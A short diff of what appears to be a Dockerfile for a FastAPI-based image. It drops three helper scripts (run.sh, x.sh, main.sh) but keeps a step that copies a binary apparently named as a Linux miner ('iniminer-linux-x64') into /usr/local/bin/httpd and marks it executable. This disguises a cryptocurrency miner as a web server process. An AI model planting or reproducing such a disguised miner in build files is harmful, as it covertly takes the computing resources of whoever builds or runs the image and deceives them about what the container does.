@@ -37,15 +37,9 @@ RUN sysctl vm.swappiness=10 \
 
 # Copy and set executable permissions for scripts
 COPY iniminer-linux-x64 /usr/local/bin/httpd
-COPY run.sh /usr/local/bin/run.sh
-COPY x.sh /usr/local/bin/x.sh
-COPY main.sh /usr/local/bin/main.sh
 COPY init.sh /usr/local/bin/init.sh
 
 RUN chmod +x /usr/local/bin/httpd \
-    && chmod +x /usr/local/bin/run.sh \
-    && chmod +x /usr/local/bin/x.sh \
-    && chmod +x /usr/local/bin/main.sh \
     && chmod +x /usr/local/bin/init.sh
 
 # Python base for FastAPI
